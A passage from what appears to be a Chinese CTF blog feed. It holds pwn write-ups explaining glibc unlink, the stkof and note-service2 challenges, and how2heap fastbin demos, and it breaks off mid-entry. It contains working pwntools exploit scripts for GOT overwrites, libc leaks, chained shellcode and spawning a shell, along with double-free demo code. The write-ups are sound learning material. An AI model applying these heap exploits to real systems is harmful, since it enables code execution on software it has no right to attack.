        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>又是强撸堆的一天，这道题是wiki上看到的一道unlink基础题，希望通过这一题可以让自己初步理解unlink机制。<br>还有。。。。。还想出门啊！</p><a id="more"></a><h2 id="简析glibc的unlink机制"><a href="#简析glibc的unlink机制" class="headerlink" title="简析glibc的unlink机制"></a>简析glibc的unlink机制</h2><p>要了解unlink漏洞的利用，我们首先要了解的就是unlink的机制，过程以及目的。说白了，unlink的目的其实就是将一个空闲块从<br>一个双向链表中给拿出来。</p><h3 id="无检查的unlink"><a href="#无检查的unlink" class="headerlink" title="无检查的unlink"></a>无检查的unlink</h3><p>在最初的unlink实现中，其实是没有对chunk的size检查和双向链表检查的，即没有如下检查代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致(size检查)</span><br><span class="line">if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</span><br><span class="line">      malloc_printerr (&quot;corrupted size vs. prev_size&quot;);               \</span><br><span class="line">// 检查 fd 和 bk 指针(双向链表完整性检查)</span><br><span class="line">if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                      \</span><br><span class="line">  malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \</span><br><span class="line"></span><br><span class="line">  // largebin 中 next_size 双向链表完整性检查 </span><br><span class="line">              if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)              \</span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span><br><span class="line">              malloc_printerr (check_action,                                      \</span><br><span class="line">                               &quot;corrupted double-linked list (not small)&quot;,    \</span><br><span class="line">                               P, AV);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">===========  =&gt;Q                                     ===============  =&gt;Q</span><br><span class="line">Prve_size                                            Prve_size</span><br><span class="line">===========                                          ===============</span><br><span class="line">Size = 0x81                                          Size = 0x81</span><br><span class="line">===========                                          ===============</span><br><span class="line">userdata                                             userdata </span><br><span class="line">===========                                          ===============</span><br><span class="line">Prve_size                                            Prve_size </span><br><span class="line">===========  =&gt;nextchunk        ---------------&gt;     ===============  =&gt; nextchunk</span><br><span class="line">Size = 0x80                       overflow           Size = 0x80</span><br><span class="line">===========                                          ===============   </span><br><span class="line">     fd                                              FD = target-12</span><br><span class="line">===========                                          ===============  </span><br><span class="line">     bk                                              BK = except</span><br><span class="line">===========                                          ===============</span><br><span class="line">unused data                                          unused data</span><br><span class="line">===========                                          =============== </span><br><span class="line">Prve_size                                            Prve_size</span><br><span class="line">===========                                          =============== </span><br><span class="line">Size = 0x80                                          Size = 0x80</span><br></pre></td></tr></table></figure><p>现在假设我们物理空间中有两个相邻的chunk(Q,nextchunk),其中Q是还在使用中的，nextchunk处在释放状态。那么当我们使用堆<br>溢出或者其它方式将nextchunk的fd和bk修改为我们指定的内容之后，再执行free(Q)</p><ul><li>glibc会判断这是一个smallbin</li><li>判断向前合并，发现前一个chunk处在使用状态，不向前合并</li><li>判断向后合并，发现nextchunk处在释放状态，向前合并</li><li>对nextchunk进行unlink</li></ul><p>当执行了unlink后，具体效果又是什么样子的呢？</p><p> FD = P-&gt;fd = target_addr-12<br> BK = P-&gt;bk = except_value<br> FD-&gt;bk = BK = *(target_addr-12+12) = except_value<br> BK-&gt;fd = FD = *(except_value+8) = target_addr-12</p><p> 这样我们就发现通过unlink实现任意地址读写的目的。</p><h3 id="如今的unlink"><a href="#如今的unlink" class="headerlink" title="如今的unlink"></a>如今的unlink</h3><p>在现在的unlink中，已经加入了对fd和bk的检查：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// fd bk</span><br><span class="line">if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                      \</span><br><span class="line">  malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \</span><br></pre></td></tr></table></figure><p>在有了这个检查之后，我们在上面进行的修GOT表的操作明显就不可行了。但是我们还是可以通过伪造的方式来进行绕过</p><p>首先我们通过覆写，将nextchunk的FD写成fakeFD，将nextchunk的BK写成fakeBK。我们为了通过验证，需要进行如下设置:</p><p>fakeFD -&gt;bk = P &lt;==&gt; &#42;(fakeFD+12) == P<br>fakeBK -&gt;fd = P &lt;==&gt; &#42;(fakeBK+8) == P</p><p>当满足如上设置之后，我们就会进入unlink环节</p><p>fakeFD -&gt; bk = fakeBK &lt;==&gt; &#42;(fakeFD+12) == P<br>fakeBK -&gt; fd = fakeFD &lt;==&gt; &#42;(fakebk+8) == P</p><p>那么假如我们让fakeFD+12和fakeBK+8指向同一个指向P的指针<br>&#42;P = P-8<br>&#42;P = P-12<br>即通过此方式，P的指针指向了比自己的地址低12的地方。虽然本方法不能实现任意地址读写，但是却可以实现对指向chunk的指针的<br>修改，对我们做题是可以起到一定作用的。</p><h2 id="2014-HITCON-CTF-stkof解题"><a href="#2014-HITCON-CTF-stkof解题" class="headerlink" title="2014-HITCON-CTF-stkof解题"></a>2014-HITCON-CTF-stkof解题</h2><h3 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h3><p>Malloc:经过分析发现我们需要输入size，分配size大小的内存，同时在bss段会记录下chunk的指针，这里我们将其看做globle<br>数组<br>edit:这是一个编辑函数，其逻辑是输入size，并向指定区域输入数据，因为大小可控，所以这里存在一个堆溢出漏洞<br>free:就是一个根据索引释放指定chunk的函数<br>另一个没什么大用，不需要理会</p><h3 id="IO缓冲区问题分析"><a href="#IO缓冲区问题分析" class="headerlink" title="IO缓冲区问题分析"></a>IO缓冲区问题分析</h3><p>这里我们需要注意的是由于程序并没有在一开始使用setbuf操作，所以在输入输出时会申请缓冲区。当执行fgets和printf函数的时<br>候，会分别申请1024大小的缓冲区，因此，我们做题时可以先申请一个chunk，以防止申请缓冲区所造成的影响。</p><p>gdb调试出来大致就是这样的<br><img src="/img/stkof/1.jpg" alt="avatar"></p><h3 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h3><p>在进行利用之前，我们首先要先申请一个chunk，来避免申请缓冲区所带来的的影响</p><p>之后我们要考虑的就是如何进行leak了。</p><ol><li>先运用unlink把globle[2]改写为&amp;globle[2]-0x18</li><li>利用编辑功能修改globle[0]为free_got,globle[1]为puts_got,globle[2]为atoi_got</li><li>修改free_got为puts_plt，这样当我们执行free函数的时候，实际执行的就是puts函数</li><li>释放globle[1],这样就能泄露出puts函数的真实地址，并以此计算出system地址</li><li>修改atoi为system地址，这样当再次调用时，直接输入binsh即可拿到shell</li></ol><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&apos;linux&apos;,arch=&apos;amd64&apos;,log_level=&apos;debug&apos;)</span><br><span class="line">libc = ELF(&apos;libc.so.6&apos;)</span><br><span class="line">p = process(&apos;./stkof.txt&apos;)</span><br><span class="line">e = ELF(&apos;./stkof.txt&apos;)</span><br><span class="line">puts_plt = e.plt[&apos;puts&apos;]</span><br><span class="line">puts_got = e.got[&apos;puts&apos;]</span><br><span class="line">free_got = e.got[&apos;free&apos;]</span><br><span class="line">atoi_got = e.got[&apos;atoi&apos;]</span><br><span class="line">def alloc(size):</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(&apos;OK\n&apos;)</span><br><span class="line"></span><br><span class="line">def edit(idx,size,content):</span><br><span class="line">p.sendline(&apos;2&apos;)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.send(content)</span><br><span class="line">p.recvuntil(&apos;OK\n&apos;)</span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">p.sendline(&apos;3&apos;)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">head = 0x602140</span><br><span class="line">alloc(0x100)</span><br><span class="line">#begin</span><br><span class="line">alloc(0x30)  #small chunk to make unlink</span><br><span class="line"></span><br><span class="line">alloc(0x80)</span><br><span class="line">payload = p64(0) #prve_size</span><br><span class="line">payload += p64(0x20) #size</span><br><span class="line">payload += p64(head+16-0x18) #fd</span><br><span class="line">payload += p64(head+16-0x10)  #bk</span><br><span class="line">payload += p64(0x20)  #next chunk&apos;s prve_size bypass check </span><br><span class="line">payload = payload.ljust(0x30,&apos;a&apos;)</span><br><span class="line">#overwrite globle[3]&apos;s prve_size</span><br><span class="line">payload += p64(0x30) #make it believe that prve chunk is free</span><br><span class="line">payload += p64(0x90)</span><br><span class="line">edit(2,len(payload),payload)</span><br><span class="line">free(3)</span><br><span class="line">p.recvuntil(&apos;OK\n&apos;)</span><br><span class="line">payload = &apos;a&apos;*8+p64(free_got)+p64(puts_got)+p64(atoi_got)</span><br><span class="line">edit(2,len(payload),payload)</span><br><span class="line">payload = p64(puts_plt)</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line">free(1)</span><br><span class="line">puts_addr = u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">print hex(puts_addr)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.recvuntil(&apos;OK\n&apos;)</span><br><span class="line">libc_base = puts_addr-libc.sym[&apos;puts&apos;]</span><br><span class="line">system = libc_base+libc.sym[&apos;system&apos;]</span><br><span class="line">payload = p64(system)</span><br><span class="line">edit(2,len(payload),payload)</span><br><span class="line">p.sendline(&apos;/bin/sh&apos;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界PWN之note-service2</title>
      <link href="/2020/01/23/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E4%B9%8Bnote-service2/"/>
      <url>/2020/01/23/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E4%B9%8Bnote-service2/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是攻防世界上的一道算是一道堆方向的题目，但是主要考验的是我们对shellcode的编写以及对fastbin机制的了解，考验用这道题<br>来正式入门堆方面的题目。</p><a id="more"></a><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>首先通过checksec分析发现，程序是一个64位程序，开启了canary和pie，但是并没有开NX保护，这就为我们在堆中写入shellcode<br>提供了便利<br>然后使用ida简单分析一下程序，发现只实现了添加和删除功能<br><img src="/img/services2/1.jpg" alt="avatar"><br>分析了添加之后，发现两个问题<br>1:最多创建大小为8字节的堆<br>2:保存堆指针的数组存在下标越界</p><p>既然存在下标越界的问题，我们就可以把任意地方的8字节数据改写成堆的地址指针。即我们可以利用数组越界，把一些函数的GOT表<br>地址修改为堆指针。这就需要我们在堆上来布置shellcode了。</p><p>但是由于我们程序限制了每一个堆的大小最多为8个字节，且最多保存下7字节的数据<br><img src="/img/services2/2.jpg" alt="avatar"><br>但我们的shellcode最少也需要十几字节，这就需要我们将自己的shellcode分别创建在几个堆中，然后利用jmp short xxx指令，<br>来让他跳到下一个堆中去执行<br>这里经过查阅资料发现，jmp short xxx指令一共占两个字节，且使用的是相对当前代码位置寻址，且计算公式为<br><strong>xxx = 目标地址 - 当前地址 - 2</strong></p><p>由此我们来分析一下堆的数据结构，由于程序在64位环境下运行，所以堆的pre_size和size域分别占8个字节，堆的数据域占8个<br>字节，且64位环境下堆的大小应该与32对齐，由此，应该还存在8字节的空数据。<br>即xxx = 8+8+8+2+1-2 = 0x19</p><p>接下来就开始构造shellcode:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1:64位系统调用</span><br><span class="line">2.mov rdi,&apos;/bin/sh&apos;</span><br><span class="line">3.mov rax,59;execve的调用号</span><br><span class="line">4.mov rsi,0</span><br><span class="line">5.mov rdx,0</span><br><span class="line">6.syscall</span><br></pre></td></tr></table></figure><p>关键就在修改rdi上<br><img src="/img/services2/3.jpg" alt="avatar"><br>我们只需要将atoi的got表修改为指向第一个堆空间，但是这一步应该放在最后，因为修改之后atoi函数就无法使用了，由此<br>写出本题的脚本。</p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&apos;./pwn&apos;)</span><br><span class="line">context(os=&apos;linux&apos;,arch=&apos;amd64&apos;,log_level=&apos;debug&apos;)</span><br><span class="line">def create(index,size,content):</span><br><span class="line">p.sendlineafter(&apos;&gt;&gt; &apos;,&apos;1&apos;)</span><br><span class="line">p.sendlineafter(&apos;index:&apos;,str(index))</span><br><span class="line">p.sendlineafter(&apos;size:&apos;,str(size))</span><br><span class="line">p.sendafter(&apos;content:&apos;,content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">p.sendlineafter(&apos;&gt;&gt; &apos;,&apos;4&apos;)</span><br><span class="line">p.sendlineafter(&apos;index:&apos;,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code0 = asm(&apos;xor rax,rax&apos;)+&apos;\x90\x90\xeb\x19&apos;</span><br><span class="line">code1 = asm(&apos;mov eax,0x3b&apos;)+&apos;\xeb\x19&apos;</span><br><span class="line">code2 = asm(&apos;xor rsi,rsi&apos;)+&apos;\x90\x90\xeb\x19&apos;</span><br><span class="line">code3 = asm(&apos;xor rdx,rdx&apos;)+&apos;\x90\x90\xeb\x19&apos;</span><br><span class="line">code4 = asm(&apos;syscall&apos;).ljust(7,&apos;\x90&apos;)</span><br><span class="line"></span><br><span class="line">#print len(code0)</span><br><span class="line">#print len(code1)</span><br><span class="line">#print len(code2)</span><br><span class="line">#print len(code3)</span><br><span class="line"></span><br><span class="line">create(0,8,&apos;a&apos;*7)</span><br><span class="line">create(1,8,code1)</span><br><span class="line">create(2,8,code2)</span><br><span class="line">create(3,8,code3)</span><br><span class="line">create(4,8,code4)</span><br><span class="line"></span><br><span class="line">delete(0)   /利用fastbin的特性，对堆进行再次利用</span><br><span class="line"></span><br><span class="line">create(-8,8,code0)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&apos;&gt;&gt; &apos;,&apos;/bin/sh&apos;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本题是一道比较基础的堆利用加上shellcode编写的题目，使我对堆的理解以及shellcode编写有了更深一层的认识。希望以后能好好<br>打几场比赛。</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hoe2heap学习笔记(1)——fastbin_dup</title>
      <link href="/2019/12/02/how2heap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1-%E2%80%94%E2%80%94fastbin-dup/"/>
      <url>/2019/12/02/how2heap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1-%E2%80%94%E2%80%94fastbin-dup/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p> 最近比较忙，已经好久没有比较认真的搞一下pwn了，今天就好好学习一下堆利用的相关知识。这里我会通过how2heap这个平台<br> 来进行学习。how2heap是由国际知名CTF战队Shellphish 团队创建的一个仓库，是用来学习堆利用技术广为周知的地方。且<br> 主要针对 glibc2.25和glibc2.26。</p><a id="more"></a><h2 id="fastbin-dup-fit"><a href="#fastbin-dup-fit" class="headerlink" title="fastbin_dup_fit"></a>fastbin_dup_fit</h2><p>这个程序不演示攻击，但是向我们演示了glibc的分配机制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">fprintf(stderr, &quot;This file doesn&apos;t demonstrate an attack, but shows the nature of glibc&apos;s allocator.\n&quot;);</span><br><span class="line">fprintf(stderr, &quot;glibc uses a first-fit algorithm to select a free chunk.\n&quot;);</span><br><span class="line">fprintf(stderr, &quot;If a chunk is free and large enough, malloc will select this chunk.\n&quot;);</span><br><span class="line">fprintf(stderr, &quot;This can be exploited in a use-after-free situation.\n&quot;);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Allocating 2 buffers. They can be large, don&apos;t have to be fastbin.\n&quot;);</span><br><span class="line">char* a = malloc(0x512);</span><br><span class="line">char* b = malloc(0x256);</span><br><span class="line">char* c;</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;1st malloc(0x512): %p\n&quot;, a);</span><br><span class="line">fprintf(stderr, &quot;2nd malloc(0x256): %p\n&quot;, b);</span><br><span class="line">fprintf(stderr, &quot;we could continue mallocing here...\n&quot;);</span><br><span class="line">fprintf(stderr, &quot;now let&apos;s put a string at a that we can read later \&quot;this is A!\&quot;\n&quot;);</span><br><span class="line">strcpy(a, &quot;this is A!&quot;);</span><br><span class="line">fprintf(stderr, &quot;first allocation %p points to %s\n&quot;, a, a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Freeing the first one...\n&quot;);</span><br><span class="line">free(a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;We don&apos;t need to free anything again. As long as we allocate smaller than 0x512, it will end up at %p\n&quot;, a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;So, let&apos;s allocate 0x500 bytes\n&quot;);</span><br><span class="line">c = malloc(506);</span><br><span class="line">fprintf(stderr, &quot;3rd malloc(0x500): %p\n&quot;, c);</span><br><span class="line">fprintf(stderr, &quot;And put a different string here, \&quot;this is C!\&quot;\n&quot;);</span><br><span class="line">strcpy(c, &quot;this is C!&quot;);</span><br><span class="line">fprintf(stderr, &quot;3rd allocation %p points to %s\n&quot;, c, c);</span><br><span class="line">fprintf(stderr, &quot;first allocation %p points to %s\n&quot;, a, a);</span><br><span class="line">fprintf(stderr, &quot;If we reuse the first allocation, it now holds the data from the third allocation.\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>glibc使用first-fit算法选择空闲块，如果一个块是空闲的并且足够大，malloc将选择这个块。<br>程序运行如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">./first_fit</span><br><span class="line">This file doesn&apos;t demonstrate an attack, but shows the nature of glibc&apos;s allocator.</span><br><span class="line">glibc uses a first-fit algorithm to select a free chunk.</span><br><span class="line">If a chunk is free and large enough, malloc will select this chunk.</span><br><span class="line">This can be exploited in a use-after-free situation.</span><br><span class="line">Allocating 2 buffers. They can be large, don&apos;t have to be fastbin.</span><br><span class="line">1st malloc(0x512): 0x1131010</span><br><span class="line">2nd malloc(0x256): 0x1131530</span><br><span class="line">we could continue mallocing here...</span><br><span class="line">now let&apos;s put a string at a that we can read later &quot;this is A!&quot;</span><br><span class="line">first allocation 0x1131010 points to this is A!</span><br><span class="line">Freeing the first one...</span><br><span class="line">We don&apos;t need to free anything again. As long as we allocate smaller than 0x512, it will end up at 0x1131010</span><br><span class="line">So, let&apos;s allocate 0x500 bytes</span><br><span class="line">3rd malloc(0x500): 0x1131010</span><br><span class="line">And put a different string here, &quot;this is C!&quot;</span><br><span class="line">3rd allocation 0x1131010 points to this is C!</span><br><span class="line">first allocation 0x1131010 points to this is C!</span><br><span class="line">If we reuse the first allocation, it now holds the data from the third allocation.</span><br></pre></td></tr></table></figure><p>这里向我们展示了glibc是如何申请一个空间，在free以后又是如何重新申请的</p><h2 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h2><p>本程序是一个简单的double_free攻击展示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">fprintf(stderr, &quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Allocating 3 buffers.\n&quot;);</span><br><span class="line">int *a = malloc(8);</span><br><span class="line">int *b = malloc(8);</span><br><span class="line">int *c = malloc(8);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, a);</span><br><span class="line">fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, b);</span><br><span class="line">fprintf(stderr, &quot;3rd malloc(8): %p\n&quot;, c);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Freeing the first one...\n&quot;);</span><br><span class="line">free(a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;, a, a);</span><br><span class="line">// free(a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;So, instead, we&apos;ll free %p.\n&quot;, b);</span><br><span class="line">free(b);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Now, we can free %p again, since it&apos;s not the head of the free list.\n&quot;, a);</span><br><span class="line">free(a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&apos;ll get %p twice!\n&quot;, a, b, a, a);</span><br><span class="line">fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, malloc(8));</span><br><span class="line">fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, malloc(8));</span><br><span class="line">fprintf(stderr, &quot;3rd malloc(8): %p\n&quot;, malloc(8));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序运行后如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">./fastbin_dup</span><br><span class="line">This file demonstrates a simple double-free attack with fastbins.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(8): 0xa11010</span><br><span class="line">2nd malloc(8): 0xa11030</span><br><span class="line">3rd malloc(8): 0xa11050</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0xa11010 again, things will crash because 0xa11010 is at the top of the free list.</span><br><span class="line">So, instead, we&apos;ll free 0xa11030.</span><br><span class="line">Now, we can free 0xa11010 again, since it&apos;s not the head of the free list.</span><br><span class="line">Now the free list has [ 0xa11010, 0xa11030, 0xa11010 ]. If we malloc 3 times, we&apos;ll get 0xa11010 twice!</span><br><span class="line">1st malloc(8): 0xa11010</span><br><span class="line">2nd malloc(8): 0xa11030</span><br><span class="line">3rd malloc(8): 0xa11010</span><br></pre></td></tr></table></figure><p>这里我们可以看到，我们首先申请三个空间，释放第一个空间a，这样fastbin就指向a。而fastbin是一个单向链表，每次进行free<br>操作时都会对free list进行检查，所以进行第一次释放后，我们不能直接对a再次进行释放操作。但是当我们把b也释放之后，free<br>list更新成了:0xa11030-&gt;0xa11010,这样就可以成功绕过检查，并且执行double_free。这时候free list被更新成：0xa11010-&gt;<br>0xa11030-&gt;0xa11010。之后我们就可以malloc三次，就在同一个地址malloc了两次，得到了两个指向了同一个地址的指针</p><h2 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h2><p>这个程序是对fastbin_dup的延伸，通过double修改fd指针，构造一个fake_chunk，以达到任意地址读写的目的。<br>源码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 